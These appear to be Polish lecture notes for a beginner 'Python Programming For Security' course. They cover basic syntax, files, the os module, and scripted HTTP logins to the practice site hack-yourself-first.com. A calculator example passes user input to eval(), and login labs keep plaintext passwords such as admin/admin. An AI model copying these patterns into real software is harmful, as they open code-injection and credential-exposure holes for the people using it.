@@ -1,0 +1,2299 @@
+📅 11.12.2022 🕘 [09:00]
+
+Wykładowca: Mateusz Dudziak
+
+Global Python Programming For Security
+
+Chapter 1 Intro to Programming & Data Types & Loops 
+= - = - = - = - = - = - =  - = - = - = - = - = - = 
+
+ℹ️ Przerwy: 
+
+10.30-11.00
+12.30-13.00
+15.00-15.30
+
+---
+
+🔗 -- Programming Languages
+https://bournetocode.com/projects/GCSE_Computing_Fundamentals/pages/3-2-9-class_prog_langs.html
+https://www.stackscale.com/blog/most-popular-programming-languages/
+https://hackr.io/blog/best-programming-languages-to-learn
+https://careerkarma.com/blog/what-python-is-used-for/
+https://www.lighthouselabs.ca/en/blog/how-and-why-companies-use-python
+https://www.netguru.com/blog/python-app-examples
+https://medium.com/cyberdefendersprogram/python-for-cybersecurity-lesson-2-useful-modules-in-python-28d1dd6b487d
+https://towardsdatascience.com/5-hidden-python-libraries-for-cyber-security-e83928777a95
+https://realpython.com/world-class-companies-using-python/
+https://www.youtube.com/watch?v=LmEcyQnfpDA
+
+🔗 -- Kursy
+https://www.youtube.com/watch?v=BBu6ZoAHIwI&t=264s
+https://www.codecademy.com/
+https://www.coursera.org/learn/interactive-python-1
+https://www.learnpython.org/
+https://www.youtube.com/watch?v=LmEcyQnfpDA
+https://www.w3schools.com/python/python_datetime.asp
+https://pynative.com/python-basic-exercise-for-beginners/
+
+---
+
+[Intro to Programming]
+
+### 📋 – Lab01 Python Installation
+
+    Pobieramy wersję instalacyjną Python
+
+https://www.python.org/downloads/windows/
+https://www.python.org/ftp/python/3.11.1/python-3.11.1-amd64.exe
+
+    Pobieramy wersję instalacyjną PyCharm
+
+https://www.jetbrains.com/pycharm/download/
+
+    Instalacja Python
+
+    zaznaczyć: "use admin privileges when installing py.exe"; "add python.exe to PATH"
+
+    proszę zaznaczyć "Disable Path limit"
+
+
+    Instalacja PyCharm
+
+    zaznaczyć: "Add "Open Folder as Project"", ".py", 
+
+
+    Uruchomienie python-a
+
+    w linii poleceń cmd należy wpisać: python
+
+
+    Uruchomienie PyCharm
+
+    start-> uruchom-> PyCharm Community Edition
+
+    File (lub + na ekranie startowym)-> New project-> podać nazwę projketu np. Day1-> zaznaczyć "Create a main.py welcome script"
+
+
+    Pierwszy przykładowy program
+
+    wpisujemy w okno nowego programu
+
+print("Hello world") 
+
+    uruchamiamy klikając na zielony trójkąt (strzałka)
+
+
+---
+program 1
+
+var_string = "To jest ciąg znaków"
+print(var_string)
+print(type(var_string))
+
+zmienna_liczbowa = 2
+print(zmienna_liczbowa)
+print(type(zmienna_liczbowa))
+
+zmienna3 = "5"
+print(zmienna3)
+print(type(zmienna3))
+
+var_bool = True
+print(var_bool)
+print(type(var_bool))
+
+var_bool = "True"
+print(var_bool)
+print(type(var_bool))
+
+var_float = 1.5
+print(var_float)
+print(type(var_float))
+
+var_float = 1,5
+print(var_float)
+print(type(var_float))
+
+---
+
+    Aby utworzyć nowy program należy kliknąć na Day1 (nazwa projektu) i dalej New-> Python file
+
+    Komentarze w programie poprzedzamy #, np.: #Program do gromadzenia danych o pracowniku
+
+
+---
+program 2
+
+#Program do gromadzenia danych o pracowniku
+
+name = input("Wprowadż swoje imię: ")
+
+print(name)
+
+age = input("Wprowadź wiek: ")
+
+height = input("Wprowadź wzrost: ")
+
+print(name)
+print(age)
+print(height)
+
+---
+program 3
+
+number = "34"
+
+print(type(number))
+print(type(int(number)))
+number2 = int(number)
+print(type(number2))
+
+---
+
+Var Casting
+
+number = 98
+print(number)
+print(type(number))
+
+#String
+print(str(number))
+print(type(str(number)))
+
+#Float
+print(float(number))
+print(type(float(number)))
+
+#Hex
+print(hex(number))
+print(type(hex(number)))
+
+#Char
+print(chr(number))
+print(type(chr(number)))
+
+***
+
+conditions.py
+
+check = 15 < 18
+print(check)
+print(type(check))
+
+check = 15 > 15
+print(check)
+print(type(check))
+
+check = 15 <= 18
+print(check)
+print(type(check))
+
+check = 15 >= 15
+print(check)
+print(type(check))
+
+check = 15 == 15
+print(check)
+print(type(check))
+
+check = 15 != 15
+print(check)
+print(type(check))
+
+check = "Jeden" == "Jeden"
+print(check)
+print(type(check))
+
+check = "Jeden" == "Dwa"
+print(check)
+print(type(check))
+
+***
+
+Porównanie długości stringów
+
+string1 = "Test"
+string2 = "test"
+
+print(len(string1))
+print(len(string2))
+
+check = len(string1) == len(string2)
+
+print(check)
+print(type(check))
+
+***
+
+if.py
+
+number1 = 20
+number2 = 20
+
+if number1 > number2:
+    print("number1 jest większa")
+elif number1 < number2:
+    print("number2 jest większa")
+else:
+    print("Liczby są sobie równe")
+   
+***
+
+ifdwa.py
+
+color = input("Podaj kolor: ")
+
+if color == "yellow":
+    print("Żółty")
+elif color == "red":
+    print("Czerwony")
+else:
+    print("Nie znaleziono koloru")
+
+***
+
+### 📋 – Lab02 Variable Casting
+
+user_age = input("Ile masz lat? ")
+
+if user_age.isdigit():
+    print("Jest liczbą")
+else:
+    print("Nie jest liczbą")
+    exit()
+
+user_age = int(user_age)
+
+if user_age < 18:
+    print("Przykro mi, nie masz 18 lat, masz", user_age, "lat")
+    print("Brakuje Ci", 18 - user_age, "lat")
+else:
+    print("Brawo! Masz 18 lat")
+
+***
+
+mathematic.py
+
+number_a = 7
+number_b = 5
+
+#Dodawanie
+print(number_a + number_b)
+print(type(number_a + number_b))
+
+#Odejmowanie
+print(number_a - number_b)
+print(type(number_a - number_b))
+
+#Mnożenie
+print(number_a * number_b)
+print(type(number_a * number_b))
+
+#Dzielenie
+print(number_a / number_b)
+print(type(number_a / number_b))
+
+#Potęga
+print(number_a ** number_b)
+print(type(number_a ** number_b))
+
+#Dzielenie z zaokrągleniem "podłoga"
+print(number_a // number_b)
+print(type(number_a // number_b))
+
+#Modulo
+print(number_a % number_b)
+print(type(number_a % number_b))
+
+#Modulo własnoręcznie
+print(number_a - (number_a // number_b) * number_b)
+
+🔗 – Operacja modulo
+https://www.computerhope.com/jargon/m/modulo.htm
+
+#Pierwiastkowanie
+import math
+print(math.sqrt(4))
+
+***
+
+### 📋 – Lab03 Max Number
+
+number1 = int(input("podaj liczbe 1: "))
+number2 = int(input("podaj liczbe 2: "))
+
+if number1 == number2:
+    print("Liczby są sobie równe")
+elif number1 > number2:
+    print("Liczba", number1, "jest większa od", number2)
+else:
+    print("Liczba", number2, "jest większa od", number1)
+
+***
+
+### 📋 – Lab04 Basic Calculator
+
+number1 = int(input("podaj liczbe 1: "))
+number2 = int(input("podaj liczbe 2: "))
+
+znak = str(input("Jakie działanie chcesz wykonać? (+ - * /): "))
+
+if znak == "+":
+    print(number1 + number2)
+elif znak == "-":
+    print(number1 - number2)
+elif znak == "*":
+    print(number1 * number2)
+elif znak == "/":
+    if number2 != 0:
+        print(number1 / number2)
+    else:
+        print("Nie dzielimy przez zero!")
+else:
+    print("Użyto nieprawidłowego znaku")
+
+***
+
+Calculator oneliner
+
+print(eval(input("Podaj działanie: ")))
+
+***
+
+[Data Types & Loops]
+
+list.py
+
+list_1 = ["Mercedes", "Ferrari", "BMW", "Bentley"]
+
+print(list_1)
+
+#Modyfikacja elementu
+list_1[0] = 'Nissan'
+
+print(list_1)
+
+#Usunięcie elementu
+del list_1[3]
+
+print(list_1)
+
+#Dodanie elementu
+list_1.append("Opel")
+
+print(list_1)
+
+#Usunięcie elementu w oparciu o nazwę
+list_1.remove("Ferrari")
+
+print(list_1)
+
+#Extend listy
+list_extend = ["Renault", "Peugeot"]
+list_1.extend(list_extend)
+print(list_1)
+
+#Insert listy
+list_1.insert(2, 'Ford')
+print(list_1)
+
+***
+
+### 📋 – Lab05 Tuple
+
+tuple.py
+
+tuple1 = ("Red", "Silver", "Gold", "Green")
+
+print(tuple1)
+print(type(tuple1))
+
+Tupli nie możemy modyfikować
+
+***
+
+### 📋 – Lab06 List
+
+Nowe polecenie:
+
+1. Utworzyć listę zawierającą 4 kolory
+2. Usunąć element o indexie 2
+3. Dodać do listy nowy kolor
+4. Usunąć jeden z kolorów w oparciu o jego nazwę
+5. Wyświetlić listę
+
+
+colors = ["red", "green", "blue", "yellow"]
+
+del colors[2]
+
+colors.append("pink")
+
+colors.remove("green")
+
+print(colors)
+
+***
+
+dictionary.py
+
+user_dict = {"name": "Kamil", "age": 46}
+
+print(user_dict)
+print(type(user_dict))
+
+print(user_dict["name"])
+
+# Dodanie elementu
+user_dict["height"] = 180
+print(user_dict)
+
+# Modyfikacja elementu
+user_dict["height"] = 185
+print(user_dict)
+
+# Usunięcie elementu
+del user_dict["height"]
+print(user_dict)
+
+***
+
+🔗 – Python Remove Key from a Dictionary
+https://careerkarma.com/blog/python-remove-key-from-a-dictionary/
+
+### 📋 – Lab07 Dictionary
+
+user_dict = {
+    "name": "David",
+    "age": 28,
+    "eyecolor": "blue"
+}
+
+print(user_dict)
+
+user_dict["age"] = 67
+
+print("Imię to", user_dict["name"], "wiek", user_dict["age"], "kolor oczu", user_dict["eyecolor"])
+print("Imię to " + user_dict["name"] + " wiek " + str(user_dict["age"]) + " kolor oczu " + user_dict["eyecolor"])
+print("Imię to {} wiek {} kolor oczu {}".format(user_dict["name"], user_dict["age"], user_dict["eyecolor"]))
+print(f'Imię to {user_dict["name"]} wiek {user_dict["age"]} kolor oczu {user_dict["eyecolor"]}')
+
+***
+
+string_manipulation.py
+
+firstname = "Mateusz"
+lastname = "Dudziak"
+
+# Dodawanie stringów
+add = firstname + " " + lastname
+print(add)
+
+# Odwołanie do elementu stringa z wykorzystaniem indexu
+acronym = firstname[0] + lastname[0]
+print(acronym)
+
+# Wykorzystanie split
+splitted = add.split(" ")
+print(splitted)
+
+# Mnożenie stringów
+print(firstname * 3)
+
+# Sprawdzanie, czy wyraz, zaczyna się od danej frazy
+print(firstname.startswith("Mat"))
+
+# Sprawdzanie, czy wyraz kończy się daną frazą
+print(firstname.endswith("usz"))
+
+# Sprawdzanie długości stringa 
+print(len(firstname))
+
+***
+
+[17.12.2022 🕘 9:00] - kontynuacja
+
+stringmanipulation.py
+
+" M  a  t  e  u  s  z"
+" 0  1  2  3  4  5  6"
+"-7 -6 -5 -4 -3 -2 -1"
+
+name = "Mateusz"
+
+#Pierwszy element
+print(name[0])
+
+#Zakresy
+print(name[0:2])
+print(name[0:6])
+print(name[0:100])
+
+print(name[2:4])
+
+print(name[:2])
+print(name[2:])
+
+#Ostatni element
+print(name[-1])
+
+#Zakresy od końca
+print(name[-3:])
+print(name[:-3])
+
+print(name[:-1])
+
+#Zakresy ze skokiem
+print(name[0:6:2])
+print(name[0:6:3])
+
+#Skok od tyłu
+print(name[::-1])
+
+***
+
+forloop.py
+
+print("Start")
+
+for x in range(5):
+    for y in range(100, 105):
+        print(x, y)
+
+print("Koniec")
+
+***
+
+print("Start")
+
+for x in 'abcdefg!@#$%':
+    for y in range(100, 105):
+        print(x, y)
+
+print("Koniec")
+
+***
+
+whileloop.py
+
+name = "Mateusz"
+
+print("Start")
+
+while len(name) < 60:
+    print(len(name))
+    name *= 2
+    print(len(name))
+    print("-------------")
+
+print("Koniec")
+
+***
+
+whileloop.py (z warunkiem)
+
+# Z continue
+
+while len(name) < 60:
+    name *= 2
+    print(name)
+    print(name.count("M"))
+    if name.count("M") == 4:
+        continue
+    print("-------------")
+
+print("Koniec")
+
+# Z break
+
+while len(name) < 60:
+    name *= 2
+    print(name)
+    print(name.count("M"))
+    if name.count("M") == 4:
+        break
+    print("-------------")
+
+print("Koniec")
+
+***
+
+### 📋 – Lab08 While Loop
+
+liczba = 10
+
+while liczba < 100:
+    liczba += 1
+    print(liczba)
+    if liczba == 75:
+        break
+
+print("I'm out!")
+
+***
+
+loopsandlists.py
+
+colors = ["blue", "red", "green", "pink", "purple", "yellow", "brown"]
+
+for color in colors:
+    print(color, color[0] + color[-1])
+
+print("-------------")
+
+for color in colors[0:6:2]:
+    print(color, color[0] + color[-1])
+
+***
+
+loopsandlists.py (2 listy)
+
+colors = ["blue", "red", "green", "pink", "purple", "yellow", "brown"]
+fruits = ["bananas", "apples", "oranges", "melons"]
+
+
+for color in colors:
+    for fruit in fruits:
+        if len(color) == len(fruit):
+            print(color, "i", fruit, "mają taką samą dlugość")
+        elif fruit[0] == color[0]:
+            print(color, "i", fruit, "mają taką samą pierwszą literę")
+        elif len(fruit) > 5 and len(color) > 5:
+            print(f'słowa {color} i {fruit} są długie!')
+        elif len(fruit) > 6 or len(color) == 6:
+            print(f'słowo {color} lub {fruit} jest długie!')
+
+***
+
+🔗 -- Python 3: instrukcje warunkowe if, else, elif
+https://hostovita.pl/blog/instrukcje-warunkowe-python-3/
+
+***
+
+### 📋 – Lab09 List & Loop
+
+list_of_cars = []
+
+for i in range(1,5):
+    car_name = input(f'Podaj nazwę {i} samochodu: ')
+    list_of_cars.append(car_name)
+
+user_decision = input("Czy chcesz wyświetlić wszystkie wpisane samochody (tak/nie): ")
+
+if user_decision == "tak":
+    for car in list_of_cars:
+        print(car)
+elif user_decision == "nie":
+    print("Bye bye")
+else:
+    print("Nieprawidłowy wpis")
+
+***
+
+infinityloop.py
+
+while True:
+    number = input("Please enter a number: ")
+    if number.isdigit():
+        print(f"You entered a number: {number}")
+    elif number == "exit":
+        break
+    else:
+        print("It's not a number")
+
+***
+
+nestedlists.py
+
+#Dwupoziomowa
+main_list = []
+
+for i in range(5):
+    main_list.append([])
+    for j in range(5):
+        main_list[i].append(j)
+
+print(main_list)
+
+#Trójpoziomowa
+main_list = []
+
+for i in range(5):
+    main_list.append([])
+    for j in range(5):
+        main_list[i].append([])
+        for k in range(5):
+            main_list[i][j].append(k)
+
+print(main_list)
+
+***
+
+### 📋 – Lab10 Supermarket List Calculator
+
+shopping_list = {}
+number_of_items_in_bracket = int(input("Ile przedmiotów jest w koszyku: "))
+total_price = 0
+
+for i in range(number_of_items_in_bracket):
+    name_of_item = input("Podaj nazwę: ")
+    price_of_item = float(input("Podaj cenę w zł: ").replace(",", "."))
+    shopping_list[name_of_item] = price_of_item
+    total_price += price_of_item
+
+print(shopping_list)
+print(f'Całkowita wartość zakupów wynosi: {total_price}')
+
+### 🏠 Homework:
+    
+
+    Zmiana for na while.
+
+    Wprowadzenie liczby produktów każdego typu (słownik list).
+
+    Total price podliczany na końcu na podstawie słownika.
+
+    Zaokrąglanie wynikowej wartości do dwóch miejsc po przecinku.
+
+
+***
+
+advanceddict.py
+
+produkty = {
+    "banan": 2,
+    "gruszka": 56,
+    "jabłko": 8
+}
+
+# Iteracja po kluczach
+for elem in produkty.keys():
+    print(elem)
+    print(produkty[elem])
+
+# Iteracja po wartościach
+for elem in produkty.values():
+    print(elem)
+
+#Iteracja po tuplach zbudowanych z rekordów słowników
+for elem in produkty.items():
+    print(elem)
+
+***
+
+📅 17.12.2022 🕘 [12:00]
+
+Wykładowca: Mateusz Dudziak
+
+Global Python Programming For Security
+
+Chapter 2 Function & Code Handling & File System & Error Handling 
+= - = - = - = - = - = - =  - = - = - = - = - = - = - = - = - = - 
+
+[Function & Code Handling]
+
+New project
+
+File -> New Project (zmiana nazwy w Location) -> Create
+
+function.py
+
+def MyFunc():
+    suma = 1 + 32
+    print(suma)
+
+MyFunc()
+
+***
+
+### 📋 – Lab01 My First Function
+
+def add_ish_from_user():
+    while True:
+        user_input = input("Wprowadź słowo: ")
+        if user_input == "exit":
+            break
+        print(user_input + "ish")
+
+add_ish_from_user()
+
+***
+
+arguments.py
+
+def Suma(liczbaA, liczbaB):
+    suma = liczbaA + liczbaB
+    print(suma)
+
+Suma(4, 5)
+
+***
+
+### 📋 – Lab02 Math Function
+
+def math(a, b):
+     print(a*2 + b*2)
+
+user_number1 = int(input("Podaj pierwszą liczbę: "))
+user_number2 = int(input("Podaj drugą liczbę: "))
+
+math(user_number1, user_number2)
+
+***
+
+return.py
+
+def Suma(liczbaA, liczbaB):
+    return liczbaA + liczbaB
+
+def Roznica(liczbaA, liczbaB):
+   return liczbaA - liczbaB
+
+result = Suma(4, 5)
+
+print(Roznica(result, 3))
+
+***
+
+### 📋 – Lab03 Login Database
+
+user_database = {
+    "admin": "admin",
+    "mdudziak": "p@ssword!",
+    "user": "123456"
+}
+
+def check_username_and_password(username, password, user_database):
+    for u, p in user_database.items():
+        if username == u and password == p:
+            return True
+    return False
+
+print("Witaj użytkowniku, by przejść dalej musisz się zalogować!")
+username = input("Podaj nazwę użytkownika: ")
+password = input("Podaj hasło: ")
+
+is_find = check_username_and_password(username, password, user_database)
+
+if is_find:
+    print("Brawo, zalogowałeś się")
+else:
+    print("Nieprawidłowe dane logowania")
+
+***
+
+scope.py
+
+numberA = 6
+numberB = 15
+
+print(numberA)
+print(numberB)
+
+print("-----------")
+
+def Local():
+    numberA = 8
+    print(numberA)
+
+def Global():
+    global numberB
+    numberB = 8
+    print(numberB)
+
+Local()
+Global()
+
+print("-----------")
+
+print(numberA)
+print(numberB)
+
+***
+
+### 📋 – Lab04 Keylogger
+
+counter = 0
+allletters = ""
+
+def Countletters(user_input):
+    global counter, allletters
+    counter += len(user_input)
+    allletters += user_input
+
+while True:
+    userInput = input("Napisz coś. By wyjść wpisz 'exit': ")
+    if userInput == "exit":
+        break
+    Countletters(userInput)
+
+    print("Łącznie podano:", counter, "znaków")
+    print("A wpisano dotychczas:\n", allletters)
+
+***
+
+calc.py
+
+def main():
+    print("Hello, to nasz program")
+    calculate()
+
+def calculate():
+    print(10 + 10)
+
+if __name__ == "__main__":
+    main()
+
+calcfinal.py
+
+import calc
+
+calc.calculate()
+
+---
+
+### 📋 – Lab05 Proper Code
+
+🔗 -- Link do pliku:
+https://ln4.sync.com/dl/5c7253e90/4ux6udpt-gmtgsdbs-2tdt6wfj-baq5pxua/view/text/10180532350007
+
+#### IMPORTS
+
+### GLOBAL VARIABLES
+adb = {
+    "user": "password",
+    "Admin": "Admin",
+}
+
+### FUNCTIONS
+
+def Intro():
+    intro = "Welcome to Messy CLI\n" \
+            "Please Register OR Login\n" \
+            "1.Login\n" \
+            "2.Register\n" \
+            "3.Quit\n"
+    print(intro)
+    return input("")
+
+def Clear():
+    i = 0
+    while i < 30:
+        print("\n")
+        i = i + 1
+
+def Auth(user, pswd):
+    global adb
+    for key in adb:
+        if key == user and adb[key] == pswd:
+            return True
+    return False
+
+def Reg():
+    global adb
+    user = input("Please Enter username\n==>")
+    try:
+        if Auth(user, adb[user]) == True:
+            print("user is already exists")
+    except:
+        pswd = input("Please Enter The password\n==>")
+        adb[user] = pswd
+        print("Registered")
+
+### MAIN
+
+def Main():
+    while True:
+        intro_result = str(Intro())
+        if intro_result == "1":
+            Clear()
+            user = input("Please Enter Your Username\n==> ")
+            pswd = input("Please Enter Your Password\n==> ")
+            if Auth(user, pswd) == True:
+                print("Welcome", user)
+                break
+            else:
+                print("Wrong Login")
+        elif intro_result == "2":
+            Clear()
+            Reg()
+        elif intro_result == "3":
+            print("ByeBye")
+            break
+        else:
+            print("Wrong Pick")
+
+### IF YOU RUN THIS FILE, IT WILL START WITH THIS FUNCTION
+
+if __name__ == '__main__':
+    Main()
+
+***
+
+datetime_module.py
+
+# Wersja z prostym importem
+import datetime
+
+def Clock():
+    now = datetime.datetime.today()
+    print("hour: ", now.hour)
+    print("minute: ", now.minute)
+    print("second: ", now.second)
+
+Clock()
+
+# Wersja z from
+from datetime import datetime 
+
+def Clock():
+    now = datetime.today()
+    print("hour: ", now.hour)
+    print("minute: ", now.minute)
+    print("second: ", now.second)
+
+Clock()
+
+#Wersja z from i as
+from datetime import datetime as dt
+
+def Clock():
+    now = dt.today()
+    print("hour: ", now.hour)
+    print("minute: ", now.minute)
+    print("second: ", now.second)
+
+Clock()
+
+# Wersja z as
+import datetime as dt 
+
+def Clock():
+    now = dt.datetime.today()
+    print("hour: ", now.hour)
+    print("minute: ", now.minute)
+    print("second: ", now.second)
+
+Clock()
+
+### 📋 – Lab06 DateToday
+
+🏠 Homework
+
+
+***
+
+random_module.py
+
+import random
+
+number = input("Wprowadź liczbę od 1 do 5: ")
+
+random_number = random.randint(1, 5)
+
+if int(number) == random_number:
+    print("Wybrałeś prawidłowo liczbę")
+else:
+    print("Błąd, poprawna liczba to: ", random_number)
+
+
+***
+
+### 📋 – Lab07 Hot N Cold
+
+import random
+
+number_of_tries = 0
+random_number = 0
+
+def check_user_prediction(userPrediction):
+    global random_number, number_of_tries
+
+    number_of_tries += 1
+    if userPrediction == random_number:
+        print("Brawo! Zgadłeś")
+        return True
+    elif abs(userPrediction - random_number) <= 5:
+        print("Bardzo gorąco")
+        return False
+    elif abs(userPrediction - random_number) <= 10:
+        print("Gorąco")
+        return False
+    elif abs(userPrediction - random_number) <= 20:
+        print("Letnio")
+        return False
+    elif abs(userPrediction - random_number) <= 40:
+        print("Zimno")
+        return False
+    else:
+        print("Bardzo zimno")
+        return False
+
+def definerandomnumber():
+    global random_number
+    random_number = random.randint(1, 100)
+
+def main():
+    global number_of_tries
+    definerandomnumber()
+
+    print("Witaj w programie!")
+    print("Wylosowałem liczbę od 1 do 100. Spróbuj ją zgadnąć!")
+
+    isFind = False
+    while isFind == False:
+        userPrediction = int(input("Podaj liczbę: "))
+        isFind = check_user_prediction(userPrediction)
+
+    print("liczba wykorzystanych prób: ", number_of_tries)
+
+
+if __name__ == "__main__":
+    main()
+
+***
+
+### 📋 – TDX ARENA - Bird Watch
+
+🏠 Homework
+
+***
+
+errorhandling.py
+
+number1 = 10
+number2 = 0
+
+try:
+    number1/number2
+except ZeroDivisionError as error:
+    print(f"Nie wolno dzielić przez zero. Error: {error}")
+finally:
+    print("Dalej działam!")
+
+print("Instrukcja dalej")
+
+***
+
+### 📋 – Lab08 Try & Accept
+
+a = int(input("Wprowadź pierwszą liczbę: "))
+b = int(input("Wprowadź drugą liczbę: "))
+
+try:
+    print(a/b)
+except Exception as error:
+    print(f"Error: {error}")
+
+***
+
+files.py
+
+data = "tekst\n"
+
+f = open("file.txt", "w")
+f.write(data)
+f.close()
+
+data2 = "tekst2"
+
+f = open("file.txt", "a")
+f.write(data2)
+f.close()
+
+f = open("file.txt", "r")
+print(f.read())
+f.close()
+
+***
+
+filesinloops.py
+
+logs = open(r'logs.txt', 'r')
+
+for line in logs:
+    clear_line = line.replace("\n", "")
+    if "Successful" in clear_line:
+        print(clear_line.split(" Successful")[0])
+
+logs.txt
+
+10.5.2021 07:56 Successful Login
+23.8.2021 09:45 Unsuccessful Login
+23.8.2021 09:46 Unsuccessful Login
+23.8.2021 09:46 Unsuccessful Login
+6.11.2021 22:32 Successful Login
+8.12.2022 23:2 Successful login
+8.12.2022 23:15 Successful login
+
+***
+
+[File System & Error Handling]
+
+### 📋 – Lab09 File Managment
+
+try:
+    with open("filemanagement.txt", "r") as f:
+        print(f.read())
+
+    with open("filemanagement.txt", "a") as f:
+        f.write("Username: admin, password: admin\n")
+except FileNotFoundError:
+    print("Nie znaleziono pliku")
+
+***
+
+osmodule.py
+
+# system
+
+import os
+
+os.system("ping 8.8.8.8")
+
+# popen
+
+import os
+
+popen_result = os.popen("ping 8.8.8.8")
+
+print(popen_result.read())
+
+conneciontest.py
+
+import os
+
+print("Sprawdzanie łączności")
+
+os.system("ping 8.8.8.8 > ping.txt")
+
+ping_file = open("ping.txt", 'r')
+
+for line in ping_file:
+    if "ms" in line:
+        print("Jest połączenie!")
+        break
+    elif "unreachable" in line:
+        print("Brak połączenia")
+        break
+    else:
+        continue
+
+***
+
+### 📋 – Lab10 OS Module
+
+import os
+import re
+
+os.system("ipconfig > ipconfig.txt")
+
+with open("ipconfig.txt", "r", encoding="iso-8859-1") as f:
+    ip = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', f.read())
+    if ip:
+        print(ip[0])
+
+
+🔗 -- Link do informacji o regexr
+
+https://regexr.com/
+
+logparsing.py
+
+2019-07-12 03:35:29 Host: IP 192.168.1.58 (Service ID: 24) - FTP Machine: VMware
+2019-07-12 03:35:29 Host: IP 192.168.1.52 (Service ID: 48) - SMB Machine: VMware
+2019-07-12 03:35:29 Host: IP 192.168.1.44 (Service ID: 22) - FTP Machine: VMware
+2019-07-12 03:35:29 Host: IP 192.168.1.34 (Service ID: 64) - RDP Machine: VMware
+2019-07-12 03:35:29 Host: IP 192.168.1.18 (Service ID: 25) - FTP Machine: VMware
+2019-07-12 03:35:29 Host: IP 192.168.1.99 (Service ID: 87) - RDP Machine: VMware
+2019-07-12 03:35:29 Host: IP 192.168.1.22 (Service ID: 64) - RDP Machine: VMware
+2019-07-12 03:35:29 Host: IP 192.168.1.11 (Service ID: 55) - SMB Machine: VMware
+2019-07-12 03:35:29 Host: IP 192.168.1.08 (Service ID: 46) - FTP Machine: VMware
+2019-07-12 03:35:29 Host: IP 192.168.1.09 (Service ID: 68) - ICMP Machine: VMware
+2019-07-12 03:35:29 Host: IP 192.168.1.88 (Service ID: 94) - HTTPS Machine: VMware
+2019-07-12 03:35:29 Host: IP 192.168.1.98 (Service ID: 45) - HTTP Machine: VMware
+2019-07-12 03:35:29 Host: IP 192.168.1.145 (Service ID: 99) - FTP Machine: VMware
+
+***
+
+### 📋 – Lab11 Split
+
+import os
+import re
+
+command = os.popen("ping 8.8.8.8")
+result = command.read()
+command.close()
+
+with open("ping.txt", 'w') as file:
+    file.write(result)
+
+with open("ping.txt", 'r') as file:
+    for line in file:
+        if "bytes" in line and "time" in line:
+            new_list = line.replace("\n", "").split(" ")
+
+            bytes = re.findall("\d+", new_list[3])
+            time = re.findall("\d+", new_list[4])
+            print(f"Bytes: {bytes[0]}, time: {time[0]} ms")
+
+***
+
+📅 18.12.2022 🕘 [11:00]
+
+Wykładowca: Mateusz Dudziak
+
+Global Python Programming For Security
+
+Chapter 3 Web Communication & Socket Fundamentals 
+= - = - = - = - = - = - =  - = - = - = - = - = - 
+
+[Web Communication]
+
+***
+
+🔗 -- link do strony do ćwiczeń
+https://hack-yourself-first.com/
+🔗 -- HTTP response status codes
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Status
+
+urllib3overview.py
+
+import urllib3
+
+http = urllib3.PoolManager()
+
+r = http.request("GET", "https://hack-yourself-first.com/")
+print(f"The page has status: {r.status}")
+print(f"Content: {r.data.decode('utf-8')}")
+
+***
+
+### 📋 – Lab01 Urllib3
+
+import urllib3
+
+http = urllib3.PoolManager()
+
+r = http.request("GET", "https://hack-yourself-first.com/")
+print(f"The page has status: {r.status}")
+print(f"Content: {r.data.decode('utf-8')}")
+
+***
+
+#Instalacja bibloteki request
+
+pip install requests
+
+getrequestfunctions.py
+
+import requests
+
+response = requests.get("https://hack-yourself-first.com")
+
+print(response.status_code)
+print(response.text)
+print(response.content)
+print(response.headers)
+
+***
+
+### 📋 – Lab02 GET Request
+
+import requests
+
+print(requests.get("https://toscrape.com").text)
+
+requestpost.py
+
+import requests
+
+payload = {
+    "Email": "test@no.3",
+    "Password": "TobylYoda"
+}
+
+try:
+    response = requests.post("https://hack-yourself-first.com/Account/Login", data=payload)
+    if "logout" in response.text:
+        print("Logged in!")
+    else:
+        print("Access denied")
+except Exception as error:
+    print(error)
+    
+
+requestwithheaders.py
+
+import requests
+
+payload = {
+    "Email": "test@no.3",
+    "Password": "TobylYoda"
+}
+
+headers = {
+    "Host": "hack-yourself-first.com",
+    "Cookie": "ASP.NET_SessionId=yslatfbko5xnhwdc24epb4on; VisitStart=12/18/2022 11:13:50 AM",
+    "Content-Length": "53",
+    "Cache-Control": "max-age=0",
+    "Sec-Ch-Ua": '"Not?A_Brand";v="8", "Chromium";v="108"',
+    "Sec-Ch-Ua-Mobile": "?0",
+    "Sec-Ch-Ua-Platform": "Windows",
+    "Upgrade-Insecure-Requests": "1",
+    "Origin": "https://hack-yourself-first.com",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-User": "?1",
+    "Sec-Fetch-Dest": "document",
+    "Referer": "https://hack-yourself-first.com/Account/Login",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept-Language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7"
+}
+
+try:
+    response = requests.post("https://hack-yourself-first.com/Account/Login", data=payload, headers=headers)
+    print(response.text)
+    if "logout" in response.text:
+        print("Logged in!")
+    else:
+        print("Access denied")
+except Exception as error:
+    print(error)
+    
+requestssessions.py
+
+import requests
+
+session = requests.session()
+
+payload = {
+    "Email": "test@no.3",
+    "Password": "TobylYoda"
+}
+
+try:
+    response = session.post("https://hack-yourself-first.com/Account/Login", data=payload)
+    if "logout" in response.text:
+        print("Logged in!")
+    else:
+        print("Access denied")
+except Exception as error:
+    print(error)
+
+
+***
+
+### 📋 – Lab03 POST Request
+
+import requests
+
+payload = {
+    "Email": "test@no.3",
+    "Password": "TobylYoda"
+}
+
+try:
+    response = requests.post("https://hack-yourself-first.com/Account/Login", data=payload)
+    if "The email or password provided is incorrect." in response.text:
+        print("Błędna próba logowania")
+    else:
+        print("Zalogowano!")
+except Exception as error:
+    print(error)
+
+***
+
+Instalacja Beautifulsoup
+
+    pip install beautifulsoup4
+
+
+***
+
+bs4overview.py
+
+import requests
+from bs4 import BeautifulSoup
+
+res = requests.get("https://hack-yourself-first.com")
+html_page = BeautifulSoup(res.text, 'html.parser')
+
+for line in html_page.find_all("title"):
+    print(line)
+
+bs4search.py
+
+import requests
+from bs4 import BeautifulSoup
+
+site = "https://hack-yourself-first.com"
+
+res = requests.get(site)
+html_page = BeautifulSoup(res.text, 'html.parser')
+
